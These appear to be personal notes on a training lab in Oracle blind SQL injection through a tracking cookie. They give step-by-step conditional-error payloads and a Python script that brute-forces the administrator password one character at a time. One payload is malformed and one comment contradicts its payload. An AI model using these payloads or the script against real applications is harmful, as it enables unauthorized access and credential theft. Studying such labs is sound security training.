This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

**Goal:** 
- Output Administrator password.
- Login as Administrator.

**Analysis:** 

1) Prove that parameter is vulnerable

```php
' || (select '' from dual) || '
``` 

-> oracle database

```php
' || (select '' from dualfiewjfow) || '
```

-> error (fake database)

2) Confirm that the users table exists in the database

```php
' || (select '' from users where rownum =1) || ' 
```

-> users table exists

3) Confirm that the administrator user exists in the users table

```php
' || (select '' from users where username='administrator') || '
```

```php
' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
```

```php
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
```

-> Internal server error 
-> administrator user exists

```php
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || '
```

-> 200 response 
-> user does not exist in database

4) Determine length of password

```php
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || '
```

-> 200 response at 50 
-> length of password is less than 50
-> 20 characters

5) Output the administrator password

```php
' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || '
```

-> w is not the first character of the password

```python
#!/usr/bin/python3

import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': '6Am99RV1VeuMUnRU' + sqli_payload_encoded, 'session': 'euKsmFZU229rrf8lqw4dt9rkJZGgBDtX'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
```

- Change `tracking id:` and `session:` to use this script: `./script www.example.com`

![[Pasted image 20240903075347.png]]

